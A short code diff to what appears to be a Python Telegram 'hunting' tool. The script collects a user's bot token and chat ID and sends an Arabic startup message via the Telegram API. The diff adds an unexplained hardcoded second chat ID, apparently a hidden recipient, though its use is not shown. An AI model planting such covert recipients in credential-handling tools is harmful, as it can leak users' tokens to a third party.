@@ -95,6 +95,7 @@ print('\n')
 token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
+ID1 =('1677652563')
 print(('—'*25)+'\n\n'+('—'*25))
 tlg1 = '\n -مرحب بك في اداة المطور ميمو\n𓅃━━━━━━━━❖━━━━━━━━━nn𝞩 \nتم تشغيل الاداة \n    \nلا تـنسى ان تـرسل صـور الـصيد -  @mx1mq\n\n '
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
